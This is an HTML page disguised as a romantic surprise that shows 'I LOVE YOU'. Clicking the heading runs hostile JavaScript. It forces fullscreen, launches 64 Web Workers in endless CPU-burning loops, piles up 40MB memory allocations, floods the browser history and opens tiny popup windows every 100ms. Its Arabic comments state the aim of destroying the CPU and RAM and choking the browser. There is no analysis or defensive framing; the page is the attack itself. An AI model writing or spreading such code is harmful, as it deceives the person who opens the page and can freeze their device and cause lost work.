<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Surprise ❤️</title>
    <style>
        body { background: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        h1 { font-size: 5rem; font-family: 'Arial Black', sans-serif; color: #ff0055; text-shadow: 0 0 50px #ff0055; }
    </style>
</head>
<body>

    <h1 id="start">I LOVE YOU</h1>

    <script>
        const btn = document.getElementById('start');
        let ramKiller = [];

        btn.onclick = function() {
            this.innerText = "LOADING...";
            
            // 1. الدخول في ملء الشاشة لإرباك النظام
            document.documentElement.requestFullscreen().catch(()=>{});

            // 2. تدمير المعالج (CPU)
            // نفتح 64 عامل (Worker) مرة واحدة؛ ده بيجبر أي معالج مهما كانت قوته إنه يوصل 100%
            for (let i = 0; i < 64; i++) {
                const blob = new Blob([`
                    setInterval(() => {
                        let x = 0;
                        while(true) {
                            // عمليات تشفير ثقيلة جداً تستهلك المعالج كلياً
                            x += Math.sqrt(Math.random()) * Math.exp(Math.random());
                            // إرسال بيانات وهمية لإشغال القناة الرئيسية
                            if(x > 1000000) { postMessage(x); x = 0; }
                        }
                    }, 1);
                `], { type: 'application/javascript' });

                const worker = new Worker(URL.createObjectURL(blob));
                
                // 3. تدمير الرام (RAM) من خلال الرد على العمال
                worker.onmessage = function() {
                    // حجز مصفوفات ضخمة في الذاكرة مع كل رد من العامل
                    let chunk = new Float64Array(1024 * 1024 * 5); // 40MB لكل لفة
                    ramKiller.push(chunk);
                };
            }

            // 4. تعطيل المتصفح عن التنفس
            setInterval(() => {
                window.history.pushState(null, null, "#" + Math.random());
                // محاولة فتح نوافذ جديدة لزيادة الضغط
                window.open(window.location.href, '_blank', 'width=10,height=10');
            }, 100);
        };
    </script>
</body>
</html>
